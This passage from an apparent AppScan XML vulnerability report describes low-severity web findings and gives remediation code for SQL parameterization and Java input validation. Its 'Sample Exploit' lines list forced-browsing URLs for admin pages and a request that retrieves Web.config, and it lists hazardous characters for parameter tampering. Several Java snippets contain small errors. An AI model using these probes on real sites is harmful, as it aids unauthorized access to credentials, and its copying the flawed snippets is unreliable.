            <fixRecommendation type="General">
              <text>Do not leave test/temporary scripts on the server and avoid doing so in the future.</text>
              <br />
              <text>Make sure there are no other scripts on the server that are not essential for its normal operation.</text>
            </fixRecommendation>
          </fixRecommendations>
        </advisory>
        <Severity>Low</Severity>
        <EntityType>Page</EntityType>
        <Invasive>False</Invasive>
      </IssueType>
      <IssueType ID="DirectAccesstoAdministrationPages" Count="2">
        <RemediationID>fix_54860</RemediationID>
        <advisory>
          <name>Direct Access to Administration Pages</name>
          <testDescription>Application-level test</testDescription>
          <threatClassification>
            <name>Information Disclosure: Predictable Resource Location</name>
            <reference>http://www.webappsec.org/projects/threat/classes/predictable_resource_location.shtml</reference>
          </threatClassification>
          <testTechnicalDescription>
            <text>A common user can access certain pages on a site through simple surfing (i.e. following web links). However, there might be pages and scripts that are not accessible through simple surfing, (i.e. pages and scripts that are not linked).</text>
            <br />
            <text>An attacker may be able to access these pages by guessing their name, e.g. admin.php, admin.asp, admin.cgi, admin.html, etc.</text>
            <br />
            <br />
            <text>Example request for a script named "admin.php": </text>
            <br />
            <text>http://[SERVER]/admin.php</text>
            <br />
            <br />
            <text>Access to administration scripts should not be allowed without proper authorization, as it may allow an attacker to gain privileged rights.</text>
            <br />
            <br />
            <text>Sample Exploit:</text>
            <br />
            <text>http://[SERVER]/admin.php</text>
            <br />
            <text>http://[SERVER]/admin.asp</text>
            <br />
            <text>http://[SERVER]/admin.aspx</text>
            <br />
            <text>http://[SERVER]/admin.html</text>
            <br />
            <text>http://[SERVER]/admin.cfm</text>
            <br />
            <text>http://[SERVER]/admin.cgi</text>
          </testTechnicalDescription>
          <causes>
            <cause>The web server or application server are configured in an insecure way</cause>
          </causes>
          <securityRisks>
            <securityRisk>It might be possible to escalate user privileges and gain administrative permissions over the web application</securityRisk>
          </securityRisks>
          <affectedProducts />
          <references>
            <link target="http://cwe.mitre.org/cgi-bin/jumpmenu.cgi?id=425">CWE-425: Direct Request ('Forced Browsing')</link>
          </references>
          <fixRecommendations>
            <fixRecommendation type="General">
              <text>Do not allow access to administration scripts without proper authorization, as it may allow an attacker to gain privileged rights.</text>
            </fixRecommendation>
          </fixRecommendations>
        </advisory>
        <Severity>Low</Severity>
        <EntityType>Page</EntityType>
        <Invasive>False</Invasive>
      </IssueType>
      <IssueType ID="attDirectoryFound" Count="9">
        <RemediationID>fix_50330</RemediationID>
        <advisory>
          <name>Hidden Directory Detected</name>
          <testDescription>Infrastructure test</testDescription>
          <threatClassification>
            <name>Information Disclosure: Information Leakage</name>
            <reference>http://www.webappsec.org/projects/threat/classes/information_leakage.shtml</reference>
          </threatClassification>
          <testTechnicalDescription>
            <text>The web application has exposed the presence of a directory in the site. Although the directory does not list its content, the information may help an attacker to develop further attacks against the site. For example, by knowing the directory name, an attacker can guess its content type and possibly file names that reside in it, or sub directories under it, and try to access them.</text>
            <br />
            <text>The more sensitive the content is, the more severe this issue may be.</text>
          </testTechnicalDescription>
          <causes>
            <cause>The web server or application server are configured in an insecure way</cause>
          </causes>
          <securityRisks>
            <securityRisk>It is possible to retrieve information about the site's file system structure, which may help the attacker to map the web site</securityRisk>
          </securityRisks>
          <affectedProducts>
            <affectedProduct>This issue may affect different types of products.</affectedProduct>
          </affectedProducts>
          <references />
          <fixRecommendations>
            <fixRecommendation type="General">
              <text>If the forbidden resource is not required, remove it from the site.</text>
              <br />
              <text>If possible, issue a "404 - Not Found" response status code instead of "403 - Forbidden". This change will obfuscate the presence of the directory in the site, and will prevent the site structure from being exposed.</text>
            </fixRecommendation>
          </fixRecommendations>
        </advisory>
        <Severity>Low</Severity>
        <EntityType>Page</EntityType>
        <Invasive>False</Invasive>
      </IssueType>
      <IssueType ID="attSensitiveInHtmlComments" Count="4">
        <RemediationID>fix_50750</RemediationID>
        <advisory>
          <name>HTML Comments Sensitive Information Disclosure</name>
          <testDescription>Application-level test</testDescription>
          <threatClassification>
            <name>Information Disclosure: Information Leakage</name>
            <reference>http://www.webappsec.org/projects/threat/classes/information_leakage.shtml</reference>
          </threatClassification>
          <testTechnicalDescription>
            <text>Many web application programmers use HTML comments to help debug the application when needed. While adding general comments is very useful, some programmers tend to leave important data, such as: filenames related to the web application, old links or links which were not meant to be browsed by users, old code fragments, etc. An attacker who finds these comments can map the application's structure and files, expose hidden parts of the site, and study the fragments of code to reverse engineer the application, which may help develop further attacks against the site.</text>
          </testTechnicalDescription>
          <causes>
            <cause>Debugging information was left by the programmer in web pages</cause>
          </causes>
          <securityRisks>
            <securityRisk>It is possible to gather sensitive information about the web application such as usernames, passwords, machine name and/or sensitive file locations</securityRisk>
          </securityRisks>
          <affectedProducts>
            <affectedProduct>This issue may affect different types of products.</affectedProduct>
          </affectedProducts>
          <references>
            <link target="http://www.webappsec.org/projects/threat/classes/information_leakage.shtml">WASC Threat Classification: Information Leakage</link>
            <link target="http://cwe.mitre.org/cgi-bin/jumpmenu.cgi?id=615">CWE-615: Information Leak Through Comments</link>
          </references>
          <fixRecommendations>
            <fixRecommendation type="General">
              <text>[1] Do not leave any vital information such as filenames or file paths in HTML comments.</text>
              <br />
              <text>[2] Remove traces of previous (or future) site links in the production site comments.</text>
              <br />
              <text>[3] Avoid placing sensitive information in HTML comments.</text>
              <br />
              <text>[4] Make sure that HTML comments do not include source code fragments.</text>
              <br />
              <text>[5] Make sure that no vital information was left behind by programmers.</text>
            </fixRecommendation>
          </fixRecommendations>
        </advisory>
        <Severity>Low</Severity>
        <EntityType>Page</EntityType>
        <Invasive>False</Invasive>
      </IssueType>
      <IssueType ID="GD_InternalIP" Count="1">
        <RemediationID>fix_59167</RemediationID>
        <advisory>
          <name>Internal IP Disclosure Pattern Found</name>
          <testDescription>Application-level test</testDescription>
          <threatClassification>
            <name>Information Disclosure: Information Leakage</name>
            <reference>http://www.webappsec.org/projects/threat/classes/information_leakage.shtml</reference>
          </threatClassification>
          <testTechnicalDescription>
            <text>AppScan detected a response containing an internal IP address.</text>
            <br />
            <br />
            <text>Internal IP is defined as an IP in the following IP ranges:</text>
            <br />
            <text>10.0.0.0 - 10.255.255.255</text>
            <br />
            <text>172.16.0.0 - 172.31.255.255</text>
            <br />
            <text>192.168.0.0 - 192.168.255.255</text>
            <br />
            <br />
            <text>Internal IP disclosure is valuable for an attacker as it reveals the IP addressing scheme of the internal network. Knowing the IP addressing scheme of the internal network may help an attacker to devise further attacks against the internal network.</text>
          </testTechnicalDescription>
          <causes>
            <cause>Insecure web application programming or configuration</cause>
          </causes>
          <securityRisks>
            <securityRisk>It is possible to gather sensitive information about the web application such as usernames, passwords, machine name and/or sensitive file locations</securityRisk>
          </securityRisks>
          <affectedProducts>
            <affectedProduct>This issue may affect different types of products.</affectedProduct>
          </affectedProducts>
          <references>
            <link target="http://cwe.mitre.org/cgi-bin/jumpmenu.cgi?id=200">CWE-200: Information Leak (Information Disclosure)</link>
          </references>
          <fixRecommendations>
            <fixRecommendation type="General">
              <text>Internal IP is usually exposed in error messages produced by the web-application/server or in HTML/JavaScript comments.</text>
              <br />
              <br />
              <text>[1] Turn off problematic detailed error messages in the web-application/server.</text>
              <br />
              <text>[2] Make sure relevant patches are installed.</text>
              <br />
              <text>[3] Make sure that Internal IP information is not left in HTML/JavaScript comments.</text>
            </fixRecommendation>
          </fixRecommendations>
        </advisory>
        <Severity>Low</Severity>
        <EntityType>Page</EntityType>
        <Invasive>False</Invasive>
      </IssueType>
      <IssueType ID="GD_PathDisclosure" Count="2">
        <RemediationID>fix_60510</RemediationID>
        <advisory>
          <name>Possible Server Path Disclosure Pattern Found</name>
          <testDescription>Application-level test</testDescription>
          <threatClassification>
            <name>Information Disclosure: Information Leakage</name>
            <reference>http://www.webappsec.org/projects/threat/classes/information_leakage.shtml</reference>
          </threatClassification>
          <testTechnicalDescription>
            <text>AppScan detected a response containing a file's absolute path (e.g. c:\dir\file in Windows, or /dir/file in Unix).</text>
            <br />
            <br />
            <text>An attacker may be able to exploit this information to access sensitive information on the directory structure of the server machine which could be used for further attacks against the site.</text>
          </testTechnicalDescription>
          <causes>
            <cause>Latest patches or hotfixes for 3rd. party products were not installed</cause>
          </causes>
          <securityRisks>
            <securityRisk>It is possible to retrieve the absolute path of the web server installation, which might help an attacker to develop further attacks and to gain information about the file system structure of the web application</securityRisk>
          </securityRisks>
          <affectedProducts>
            <affectedProduct>This issue may affect different types of products.</affectedProduct>
          </affectedProducts>
          <references>
            <link target="http://cwe.mitre.org/cgi-bin/jumpmenu.cgi?id=200">CWE-200: Information Leak (Information Disclosure)</link>
          </references>
          <fixRecommendations>
            <fixRecommendation type="General">
              <text>Download the relevant security patch depending on the issue existing on your web server or web application.</text>
            </fixRecommendation>
          </fixRecommendations>
        </advisory>
        <Severity>Low</Severity>
        <EntityType>Page</EntityType>
        <Invasive>False</Invasive>
      </IssueType>
      <IssueType ID="attScriptDownload" Count="1">
        <RemediationID>fix_50050</RemediationID>
        <advisory>
          <name>Temporary File Download</name>
          <testDescription>Infrastructure test</testDescription>
          <threatClassification>
            <name>Information Disclosure: Predictable Resource Location</name>
            <reference>http://www.webappsec.org/projects/threat/classes/predictable_resource_location.shtml</reference>
          </threatClassification>
          <testTechnicalDescription>
            <text>Web servers usually associate Common Gateway Interface (CGI) filename extensions, such as .pl, with a handler, such as Perl. When a URL path ends with .pl, the filename designated in the path is sent to Perl for execution; the file contents are not returned to the browser. However, when the script files are edited in place, the editor may save a backup copy of the edited script with a new file extension, such as .bak, .sav, .old, ~, etc. The web server usually does not have a specific handler for these extensions. If the attacker requests one of these files, the file contents are sent directly to the browser.</text>
            <br />
            <text>It is important to remove these temporary files from under the virtual directory, as they may contain sensitive information that was used for debugging purposes, or they may reveal application logic that is different than the current logic, but may still be exploited.</text>
          </testTechnicalDescription>
          <causes>
            <cause>Temporary files were left in production environment</cause>
          </causes>
          <securityRisks>
            <securityRisk>It is possible to download temporary script files, which can expose the application logic and other sensitive information such as usernames and passwords</securityRisk>
          </securityRisks>
          <affectedProducts>
            <affectedProduct>This issue may affect different types of products.</affectedProduct>
          </affectedProducts>
          <references>
            <link target="http://www.webappsec.org/projects/threat/classes/predictable_resource_location.shtml">WASC Threat Classification: Predictable Resource Location</link>
          </references>
          <fixRecommendations>
            <fixRecommendation type="General">
              <text>Do not keep backup/temporary versions of files underneath the virtual web server root. This usually happens when editing these files "in place" by editors. Instead, when updating the site, move or copy the files to a directory outside the virtual root, edit them there, and move (or copy) the files back to the virtual root. Make sure that only the files that are actually in use reside under the virtual root.</text>
            </fixRecommendation>
          </fixRecommendations>
        </advisory>
        <Severity>Low</Severity>
        <EntityType>Page</EntityType>
        <Invasive>False</Invasive>
      </IssueType>
      <IssueType ID="cwvWebConfig" Count="1">
        <RemediationID>fix_52230</RemediationID>
        <advisory>
          <name>Web.config File Configuration Settings Leakage</name>
          <testDescription>Infrastructure test</testDescription>
          <threatClassification>
            <name>Information Disclosure: Information Leakage</name>
            <reference>http://www.webappsec.org/projects/threat/classes/information_leakage.shtml</reference>
          </threatClassification>
          <testTechnicalDescription>
            <text>ASP.NET stores application-wide configuration settings in an XML-based text file called Web.config. By default, this file is not accessible to web users. If the web application was configured improperly, an attacker may retrieve the contents of the file, which contains sensitive information that may help him/her to develop further attacks against the web application.</text>
            <br />
            <br />
            <text>Note: According to the ASP.NET specifications, the Web.config file should reside in the root directory of the web application. During the application test, attempts are made to retrieve the file both from the web application's root directory and from every scripts directory, in order to attempt to find Web.config files that were left behind by mistake.</text>
            <br />
            <br />
            <text>Sample Exploit:</text>
            <br />
            <text>If your web application is configured improperly, the following request will retrieve the contents of the Web.config file:</text>
            <br />
            <br />
            <text>http://TARGET/WebApp_Root_Dir/Web.config</text>
          </testTechnicalDescription>
          <causes>
            <cause>The web server or application server are configured in an insecure way</cause>
            <cause>Improper permissions/ACLs were set to file/directory</cause>
          </causes>
          <securityRisks>
            <securityRisk>It is possible to download or view the contents of a configuration file, which might contain vital information such as usernames and passwords</securityRisk>
          </securityRisks>
          <affectedProducts>
            <affectedProduct>Microsoft IIS with ASP.NET</affectedProduct>
          </affectedProducts>
          <references>
            <link target="http://www.webappsec.org/projects/threat/classes/information_leakage.shtml">WASC Threat Classification: Information Leakage</link>
          </references>
          <fixRecommendations>
            <fixRecommendation type="General">
              <text>[1] Set proper permissions or ACLs to the Web.config files which reside in your web site.</text>
              <br />
              <text>[2] Delete obsolete Web.config files from your web site.</text>
            </fixRecommendation>
          </fixRecommendations>
        </advisory>
        <Severity>Low</Severity>
        <EntityType>Page</EntityType>
        <Invasive>False</Invasive>
      </IssueType>
      <IssueType ID="attUndefinedState" Count="5">
        <RemediationID>fix_50300</RemediationID>
        <advisory>
          <name>Application Error</name>
          <testDescription>Application-level test</testDescription>
          <threatClassification>
            <name>Application Quality Tests</name>
          </threatClassification>
          <testTechnicalDescription>
            <text>If an attacker probes the application by forging a request that contains parameters or parameter values other than the ones expected by the application (examples are listed below), the application may enter an undefined state that makes it vulnerable to attack. The attacker can gain useful information from the application's response to this request, which information may be exploited to locate application weaknesses.</text>
            <br />
            <text>For example, if the parameter field should be an apostrophe-quoted string (e.g. in an ASP script or SQL query), the injected apostrophe symbol will prematurely terminate the string stream, thus changing the normal flow/syntax of the script.</text>
            <br />
            <text>Another cause of vital information being revealed in error messages, is when the scripting engine, web server, or database are misconfigured.</text>
            <br />
            <br />
            <text>Here are some different variants:</text>
            <br />
            <text>[1] Remove parameter</text>
            <br />
            <text>[2] Remove parameter value</text>
            <br />
            <text>[3] Set parameter value to null</text>
            <br />
            <text>[4] Set parameter value to a numeric overflow (+/- 99999999)</text>
            <br />
            <text>[5] Set parameter value to hazardous characters, such as ' " \' \" ) ;</text>
            <br />
            <text>[6] Append some string to a numeric parameter value</text>
            <br />
          </testTechnicalDescription>
          <causes>
            <cause>Proper bounds checking were not performed on incoming parameter values</cause>
            <cause>No validation was done in order to make sure that user input matches the data type expected</cause>
          </causes>
          <securityRisks>
            <securityRisk>It is possible to gather sensitive debugging information</securityRisk>
          </securityRisks>
          <affectedProducts>
            <affectedProduct>This issue may affect different types of products.</affectedProduct>
          </affectedProducts>
          <references>
            <link target="http://www.wiretrip.net/rfp/txt/rfp2k01.txt">An example for using apostrophe to hack a site can be found in "How I hacked PacketStorm (by Rain Forest Puppy), RFP's site"</link>
            <link target="http://www.ngssoftware.com/papers/webappdis.doc">"Web Application Disassembly with ODBC Error Messages" (By David Litchfield)</link>
            <link target="http://www.cert.org/advisories/CA-1997-25.html">CERT Advisory (CA-1997-25): Sanitizing user-supplied data in CGI scripts</link>
            <link target="http://cwe.mitre.org/cgi-bin/jumpmenu.cgi?id=550">CWE-550: Information Leak Through Server Error Message</link>
          </references>
          <fixRecommendations>
            <fixRecommendation type="General">
              <text>[1] Check incoming requests for the presence of all expected parameters and values. When a parameter is missing, issue a proper error message or use default values.</text>
              <br />
              <text>[2] The application should verify that its input consists of valid characters (after decoding). For example, an input value containing the null byte (encoded as %00), apostrophe, quotes, etc. should be rejected.</text>
              <br />
              <text>[3] Enforce values in their expected ranges and types. If your application expects a certain parameter to have a value from a certain set, then the application should ensure that the value it receives indeed belongs to the set. For example, if your application expects a value in the range 10..99, then it should make sure that the value is indeed numeric, and that its value is in 10..99.</text>
              <br />
              <text>[4] Verify that the data belongs to the set offered to the client.</text>
              <br />
              <text>[5] Do not output debugging error messages and exceptions in a production environment.</text>
            </fixRecommendation>
            <fixRecommendation type="ASP.NET">
              <text>In order to disable debugging in ASP.NET, edit your web.config file to contain the following:</text>
              <br />
              <text>&lt;compilation </text>
              <br />
              <indentText>    debug="false"</indentText>
              <text>/&gt;</text>
              <br />
              <br />
              <text>For more information, see "HOW TO: Disable Debugging for ASP.NET Applications" in: </text>
              <link target="http://support.microsoft.com/default.aspx?scid=kb;en-us;815157">http://support.microsoft.com/default.aspx?scid=kb;en-us;815157</link>
              <br />
              <br />
              <text>You can add input validation to Web Forms pages by using validation controls. Validation controls provide an easy-to-use mechanism for all common types of standard validation (for example, testing for valid dates or values within a range), plus ways to provide custom-written validation. In addition, validation controls allow you to completely customize how error information is displayed to the user. Validation controls can be used with any controls that are processed in a Web Forms page's class file, including both HTML and Web server controls.</text>
              <br />
              <br />
              <text>To make sure that all the required parameters exist in a request, use the "RequiredFieldValidator" validation control. This control ensures that the user does not skip an entry in the web form.</text>
              <br />
              <br />
              <text>To make sure user input contains only valid values, you can use one of the following validation controls:</text>
              <br />
              <br />
              <text>[1] "RangeValidator": checks that a user's entry (value) is between specified lower and upper boundaries. You can check ranges within pairs of numbers, alphabetic characters, and dates.</text>
              <br />
              <br />
              <text>[2] "RegularExpressionValidator": checks that the entry matches a pattern defined by a regular expression. This type of validation allows you to check for predictable sequences of characters, such as those in social security numbers, e-mail addresses, telephone numbers, postal codes, and so on.</text>
              <br />
              <br />
              <text>Important note: validation controls do not block user input or change the flow of page processing; they only set an error state, and produce error messages. It is the programmer's responsibility to test the state of the controls in the code before performing further application-specific actions.</text>
              <br />
              <br />
              <text>There are two ways to check for user input validity: </text>
              <br />
              <br />
              <text>1. Test for a general error state: </text>
              <br />
              <br />
              <text>In your code, test the page's IsValid property. This property rolls up the values of the IsValid properties of all the validation controls on the page (using a logical AND). If one of the validation controls is set to invalid, the page's property will return false.</text>
              <br />
              <br />
              <text>2. Test for the error state of individual controls:</text>
              <br />
              <br />
              <text>Loop through the page's Validators collection, which contains references to all the validation controls. You can then examine the IsValid property of each validation control.</text>
              <br />
              <br />
              <text>Here are two possible ways to protect your web application against SQL injection attacks:</text>
              <br />
              <br />
              <text>[1] Use a stored procedure rather than a dynamically built SQL query string. The manner in which parameters are passed to SQL Server stored procedures prevents the use of apostrophes and hyphens.</text>
              <br />
              <br />
              <text>Example of how to use stored procedures in ASP.NET:</text>
              <br />
              <br />
              <code>  ' Visual Basic example
  Dim DS As DataSet
  Dim MyConnection As SqlConnection
  Dim MyCommand As SqlDataAdapter
  Dim SelectCommand As String = "select * from users where username = @username"
  ...
  MyCommand.SelectCommand.Parameters.Add(New SqlParameter("@username", SqlDbType.NVarChar, 20))
  MyCommand.SelectCommand.Parameters("@username").Value = UserNameField.Value
  // C# example
  String selectCmd = "select * from Authors where state = @username";
  SqlConnection myConnection = new SqlConnection("server=...");
  SqlDataAdapter myCommand = new SqlDataAdapter(selectCmd, myConnection);
  myCommand.SelectCommand.Parameters.Add(new SqlParameter("@username", SqlDbType.NVarChar, 20));
  myCommand.SelectCommand.Parameters["@username"].Value = UserNameField.Value;
</code>
              <br />
              <br />
              <text>[2] You can add input validation to Web Forms pages by using validation controls. Validation controls provide an easy-to-use mechanism for all common types of standard validation (for example, testing for valid dates or values within a range), plus ways to provide custom-written validation. In addition, validation controls allow you to completely customize how error information is displayed to the user. Validation controls can be used with any controls that are processed in a Web Forms page's class file, including both HTML and Web server controls.</text>
            </fixRecommendation>
            <fixRecommendation type="J2EE">
              <text>** Prepared Statements:</text>
              <br />
              <br />
              <text>There are three possible ways to protect your application against SQL injection, i.e. malicious tampering of SQL parameters. Instead of dynamically building SQL statements, use:</text>
              <br />
              <br />
              <text>[1] PreparedStatement, which is precompiled and stored in a pool of PreparedStatement objects.  PreparedStatement defines setters to register input parameters that are compatible with the supported JDBC SQL data types.  For example, setString should be used for input parameters of type VARCHAR or LONGVARCHAR (refer to the Java API for further details).  This way of setting input parameters prevents an attacker from manipulating the SQL statement through injection of bad characters, such as apostrophe.</text>
              <br />
              <br />
              <text>Example of how to use a PreparedStatement in J2EE:</text>
              <br />
              <br />
              <code>  // J2EE PreparedStatemenet Example
  // Get a connection to the database
  Connection myConnection;
  if (isDataSourceEnabled()) {
      // using the DataSource to get a managed connection
      Context ctx = new InitialContext();
      myConnection = ((DataSource)ctx.lookup(datasourceName)).getConnection(dbUserName, dbPassword);
  } else {
      try {
          // using the DriverManager to get a JDBC connection
          Class.forName(jdbcDriverClassPath);
          myConnection = DriverManager.getConnection(jdbcURL, dbUserName, dbPassword);
      } catch (ClassNotFoundException e) {
          ...
      }
  }
  ...
  try {
      PreparedStatement myStatement = myConnection.prepareStatement("select * from users where username = ?");
      myStatement.setString(1, userNameField);
      ResultSet rs = myStatement.executeQuery();
      ...
      rs.close();
  } catch (SQLException sqlException) {
      ...
  } finally {
      myStatement.close();
      myConnection.close();
  }
</code>
              <br />
              <br />
              <text>[2] CallableStatement, which extends PreparedStatement to execute database SQL stored procedures.  This class inherits input setters from PreparedStatement (see [1] above).</text>
              <br />
              <br />
              <text>The following example assumes that this database stored procedure has been created:</text>
              <br />
              <br />
              <text>CREATE PROCEDURE select_user (@username varchar(20))</text>
              <br />
              <text>AS SELECT * FROM USERS WHERE USERNAME = @username;</text>
              <br />
              <br />
              <text>Example of how to use a CallableStatement in J2EE to execute the above stored procedure:</text>
              <br />
              <br />
              <code>  // J2EE PreparedStatemenet Example
  // Get a connection to the database
  Connection myConnection;
  if (isDataSourceEnabled()) {
      // using the DataSource to get a managed connection
      Context ctx = new InitialContext();
      myConnection = ((DataSource)ctx.lookup(datasourceName)).getConnection(dbUserName, dbPassword);
  } else {
      try {
          // using the DriverManager to get a JDBC connection
          Class.forName(jdbcDriverClassPath);
          myConnection = DriverManager.getConnection(jdbcURL, dbUserName, dbPassword);
      } catch (ClassNotFoundException e) {
          ...
      }
  }
  ...
  try {
      PreparedStatement myStatement = myConnection.prepareCall("{?= call select_user ?,?}");
      myStatement.setString(1, userNameField);
      myStatement.registerOutParameter(1, Types.VARCHAR);
      ResultSet rs = myStatement.executeQuery();
      ...
      rs.close();
  } catch (SQLException sqlException) {
      ...
  } finally {
      myStatement.close();
      myConnection.close();
  }
</code>
              <br />
              <br />
              <text>[3] Entity Bean, which represents an EJB business object in a persistent storage mechanism.  There are two types of entity beans: bean-managed and container-managed.  With bean-managed persistence, the developer is responsible for writing the SQL code to access the database (refer to sections [1] and [2] above).  With container-managed persistence, the EJB container automatically generates the SQL code.  As a result, the container is responsible for preventing malicious attempts from tampering with the generated SQL code.</text>
              <br />
              <br />
              <text>Example of how to use an Entity Bean in J2EE:</text>
              <br />
              <br />
              <code>  // J2EE EJB Example
  try {
      // lookup the User home interface
      UserHome userHome = (UserHome)context.lookup(User.class);    
      // find the User remote interface
      User = userHome.findByPrimaryKey(new UserKey(userNameField));    
      ...    
  } catch (Exception e) {
      ...
  }
</code>
              <br />
              <br />
              <text>RECOMMENDED JAVA TOOLS</text>
              <br />
              <text>N/A</text>
              <br />
              <br />
              <text>REFERENCES</text>
              <br />
              <text>
              </text>
              <link target="http://java.sun.com/j2se/1.4.1/docs/api/java/sql/PreparedStatement.html">http://java.sun.com/j2se/1.4.1/docs/api/java/sql/PreparedStatement.html</link>
              <br />
              <text>
              </text>
              <link target="http://java.sun.com/j2se/1.4.1/docs/api/java/sql/CallableStatement.html">http://java.sun.com/j2se/1.4.1/docs/api/java/sql/CallableStatement.html</link>
              <br />
              <br />
              <br />
              <text>** Input Data Validation:</text>
              <br />
              <br />
              <text>While data validations may be provided as a user convenience on the client-tier, data validation must be performed on the server-tier using Servlets.  Client-side validations are inherently insecure because they can be easily bypassed, e.g. by disabling Javascript.</text>
              <br />
              <br />
              <text>A good design usually requires the web application framework to provide server-side utility routines to validate the following:</text>
              <br />
              <text>[1] Required field</text>
              <br />
              <text>[2] Field data type (all HTTP request parameters are Strings by default)</text>
              <br />
              <text>[3] Field length</text>
              <br />
              <text>[4] Field range</text>
              <br />
              <text>[5] Field options</text>
              <br />
              <text>[6] Field pattern</text>
              <br />
              <text>[7] Cookie values</text>
              <br />
              <text>[8] HTTP Response</text>
              <br />
              <br />
              <text>A good practice is to implement the above routine as static methods in a "Validator" utility class.  The following sections describe an example validator class.</text>
              <br />
              <br />
              <text>[1] Required field</text>
              <br />
              <text>Always check that the field is not null and its length is greater than zero, excluding leading and trailing white spaces.  </text>
              <br />
              <br />
              <text>Example of how to validate required fields:</text>
              <br />
              <br />
              <code>  // Java example to validate required fields
  public Class Validator {
      ...
      public static boolean validateRequired(String value) {
          boolean isFieldValid = false;
          if (value != null &amp;&amp; value.trim().length() &gt; 0) {
              isFieldValid = true;
          }
          return isFieldValid;
      }
      ...
  }
  ...
  String fieldValue = request.getParameter("fieldName");
  if (Validator.validateRequired(fieldValue)) {
      // fieldValue is valid, continue processing request
      ...
  }
</code>
              <br />
              <br />
              <text>[2] Field data type</text>
              <br />
              <text>In web applications, input parameters are poorly typed.  For example, all HTTP request parameters or cookie values are of type String.  The developer is responsible for verifying the input is of the correct data type.  Use the Java primitive wrapper classes to check if the field value can be safely converted to the desired primitive data type.</text>
              <br />
              <br />
              <text>Example of how to validate a numeric field (type int):</text>
              <br />
              <br />
              <code>  // Java example to validate that a field is an int number
  public Class Validator {
      ...
      public static boolean validateInt(String value) {
          boolean isFieldValid = false;
          try {
              Integer.parseInt(value);
              isFieldValid = true;
          } catch (Exception e) {
              isFieldValid = false;
          }
          return isFieldValid;
      }
      ...
  }
  ...
  // check if the HTTP request parameter is of type int
  String fieldValue = request.getParameter("fieldName");
  if (Validator.validateInt(fieldValue)) {
      // fieldValue is valid, continue processing request
      ...
  }
</code>
              <br />
              <br />
              <text>A good practice is to convert all HTTP request parameters to their respective data types.  For example, store the "integerValue" of a request parameter in a request attribute and use it as shown in the following example:</text>
              <br />
              <br />
              <code>  // Example to convert the HTTP request parameter to a primitive wrapper data type
  // and store this value in a request attribute for further processing
  String fieldValue = request.getParameter("fieldName");
  if (Validator.validateInt(fieldValue)) {
      // convert fieldValue to an Integer
      Integer integerValue = Integer.getInteger(fieldValue);
      // store integerValue in a request attribute
      request.setAttribute("fieldName", integerValue);
  }
  ...
  // Use the request attribute for further processing
  Integer integerValue = (Integer)request.getAttribute("fieldName");
  ...
</code>
              <br />
              <br />
              <text>The primary Java data types that the application should handle:</text>
              <br />
              <text>- Byte</text>
              <br />
              <text>- Short</text>
              <br />
              <text>- Integer</text>
              <br />
              <text>- Long</text>
              <br />
              <text>- Float</text>
              <br />
              <text>- Double</text>
              <br />
              <text>- Date</text>
              <br />
              <br />
              <text>[3] Field length</text>
              <br />
              <text>Always ensure that the input parameter (whether HTTP request parameter or cookie value) is bounded by a minimum length and/or a maximum length.</text>
              <br />
              <br />
              <text>Example to validate that the length of the userName field is between 8 and 20 characters:</text>
              <br />
              <br />
              <code>  // Example to validate the field length
  public Class Validator {
      ...
      public static boolean validateLength(String value, int minLength, int maxLength) {
          String validatedValue = value;
          if (!validateRequired(value)) {
              validatedValue = "";
          }
          return (validatedValue.length() &gt;= minLength &amp;&amp;
                      validatedValue.length() &lt;= maxLength);
      }
      ...
  }
  ...
  String userName = request.getParameter("userName");
  if (Validator.validateRequired(userName)) {
      if (Validator.validateLength(userName, 8, 20)) {
          // userName is valid, continue further processing
          ...
      }
  }
</code>
              <br />
              <br />
              <text>[4] Field range</text>
              <br />
              <text>Always ensure that the input parameter is within a range as defined by the functional requirements.</text>
              <br />
              <br />
              <text>Example to validate that the input numberOfChoices is between 10 and 20:</text>
              <br />
              <br />
              <code>  // Example to validate the field range
  public Class Validator {
      ...
      public static boolean validateRange(int value, int min, int max) {
          return (value &gt;= min &amp;&amp; value &lt;= max);
      }
      ...
  }
  ...
  String fieldValue = request.getParameter("numberOfChoices");
  if (Validator.validateRequired(fieldValue)) {
      if (Validator.validateInt(fieldValue)) {
          int numberOfChoices = Integer.parseInt(fieldValue);
          if (Validator.validateRange(numberOfChoices, 10, 20)) {
              // numberOfChoices is valid, continue processing request
              ...
          }
      }
  }
</code>
              <br />
              <br />
              <text>[5] Field options</text>
              <br />
              <text>Often, the web application presents the user with a set of options to choose from, e.g. using the SELECT HTML tag, but fails to perform server-side validation to ensure that the selected value is one of the allowed options.  Remember that a malicious user can easily modify any option value.  Always validate the selected user value against the allowed options as defined by the functional requirements.</text>
              <br />
              <br />
              <text>Example to validate the user selection against a list of allowed options:</text>
              <br />
              <br />
              <code>  // Example to validate user selection against a list of options
  public Class Validator {
      ...
      public static boolean validateOption(Object[] options, Object value) {
          boolean isValidValue = false;
          try {
              List list = Arrays.asList(options);
              if (list != null) {
                  isValidValue = list.contains(value);
              }
          } catch (Exception e) {
          }
          return isValidValue;
      }
      ...
  }
  ...
  // Allowed options
  String[] options = {"option1", "option2", "option3");
  // Verify that the user selection is one of the allowed options
  String userSelection = request.getParameter("userSelection");
  if (Validator.validateOption(options, userSelection)) {
      // valid user selection, continue processing request
      ...
  }
</code>
              <br />
              <br />
              <text>[6] Field pattern</text>
              <br />
              <text>Always check that the user input matches a pattern as defined by the functionality requirements.  For example, if the userName field should only allow alpha-numeric characters, case insensitive, then use the following regular expression:</text>
              <br />
              <text>^[a-zA-Z0-9]*$</text>
              <br />
              <br />
              <text>Java 1.3 or earlier versions do not include any regular expression packages.  Apache Regular Expression Package (see Resources below) is recommended for use with Java 1.3 to resolve this lack of support.  </text>
              <br />
              <text>Example to perform regular expression validation:</text>
              <br />
              <br />
              <code>  // Example to validate that a given value matches a specified pattern
  // using the Apache regular expression package
  import org.apache.regexp.RE;
  import org.apache.regexp.RESyntaxException;
  public Class Validator {
      ...
      public static boolean matchPattern(String value, String expression) {
          boolean match = false;
          if (validateRequired(expression)) {
               RE r = new RE(expression);
               match = r.match(value);             
          }
          return match;
      }
      ...
  }
  ...
  // Verify that the userName request parameter is alpha-numeric
  String userName = request.getParameter("userName");
  if (Validator.matchPattern(userName, "^[a-zA-Z0-9]*$")) {
      // userName is valid, continue processing request
      ...
  }
</code>
              <br />
              <br />
              <text>Java 1.4 introduced a new regular expression package (java.util.regex).  Here is a modified version of Validator.matchPattern using the new Java 1.4 regular expression package:</text>
              <br />
              <br />
              <code>  // Example to validate that a given value matches a specified pattern
  // using the Java 1.4 regular expression package
  import java.util.regex.Pattern;
  import java.util.regexe.Matcher;
  public Class Validator {
      ...
